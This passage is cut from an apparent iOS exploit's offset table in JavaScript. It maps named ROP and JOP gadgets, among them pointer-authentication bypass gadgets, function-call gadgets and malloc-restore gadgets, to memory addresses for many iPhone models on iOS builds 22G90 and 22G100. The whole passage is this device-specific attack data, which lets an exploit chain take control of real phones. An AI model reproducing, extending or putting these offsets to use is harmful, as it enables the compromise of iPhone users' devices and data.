      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone16,2_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,1_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,2_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,3_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c925ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2616f598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },

    "iPhone11,2_4_6_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23abd402cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c61dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d6698cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef4e2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone11,8_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c5e1ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d5198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,1_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,3_5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,8_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23aaba02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c53dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d8398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ee302ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,1_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2610de98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,2_3_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,2_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,3_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,6_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a91f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7b8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26145098cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ec952ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,7_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,8_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,2_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,3_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone16,1_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
